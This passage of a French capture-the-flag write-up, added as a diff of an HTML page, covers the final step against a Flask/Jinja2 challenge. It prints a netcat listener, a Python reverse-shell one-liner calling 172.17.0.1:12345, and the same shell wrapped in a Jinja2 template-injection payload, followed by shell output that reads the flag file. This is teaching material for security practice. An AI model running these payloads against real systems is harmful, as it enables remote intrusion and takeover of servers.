+<p>Chez nous, on lance <code>nc -l -v -p 12345</code>. On pense à récupérer son IP et à faire le nécessaire pour être contactable par le serveur (<em>port-forwarding</em>; pas utile dans mon cas).</p>
+<p>Sur le serveur, on lance le <em>reverse shell</em>. J&rsquo;ai choisi :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;172.17.0.1&#34;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span></code></pre></div><p>Ce qui donne, enrobé dans notre <em>payload</em> d&rsquo;injection de commande shell :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]()<span style="color:#f92672">.</span>load_module(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">172.17.0.1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>) }}
+</span></span></code></pre></div><p>On lance le <em>payload</em>, et la magie s&rsquo;opère. On a un *shell.</p>
+<pre tabindex="0"><code>/app $ ls
+content.json
+flag.txt
+jajaja.py
+static
+templates
+</code></pre><pre tabindex="0"><code>/app $ cat flag.txt
+FCSC{****************************************}
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>Passer par l&rsquo;extraction en aveugle n&rsquo;était sans doute pas la manière la plus rapide d&rsquo;obtenir le flag, mais je trouve qu&rsquo;on s&rsquo;est bien amusé :-).</p>
+<h2 id="todo">TODO</h2>
+<ul>
+<li>Mots clés: liens (Flask, Jinja2)</li>
+<li>Orthographe</li>
+<li>CSS pour changer l&rsquo;overflow des blocs de code : ça doit fit entier sur l&rsquo;écran</li>
+<li>fix le blog &hellip;.. (entre private et public)</li>
+<li>publier le writeup</li>
+<li>l&rsquo;envoyer sur la plateforme hackropole</li>
+</ul>
+
+  <hr>
+<div class="footer">
+    
+	    
+	    
+    
+</div>
+
+  
+    <div class="comments">
+    
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "poison" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#petit-tour-du-propriétaire">Petit tour du propriétaire</a></li>
+    <li><a href="#tromperie-et-rires-hispanophones">Tromperie, et rires hispanophones</a></li>
+    <li><a href="#première-injection-et-bypass-du-waf">Première injection et bypass du WAF</a></li>
+    <li><a href="#objectif-exécuter-des-commandes-shell">Objectif: exécuter des commandes <em>shell</em></a></li>
+    <li><a href="#chasse-au-trésor">Chasse au trésor</a></li>
+    <li><a href="#extraction-de-string-bit-par-bit">Extraction de string bit par bit</a></li>
+    <li><a href="#reconstruction-de-built-ins-inaccessibles">Reconstruction de built-ins inaccessibles</a></li>
+    <li><a href="#script-local-pour-dump-une-chaîne-bit-par-bit">Script local pour dump une chaîne bit par bit</a></li>
+    <li><a href="#importer-le-module-os">Importer le module <em>os</em></a></li>
+    <li><a href="#reverse-shell">Reverse shell</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#todo">TODO</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
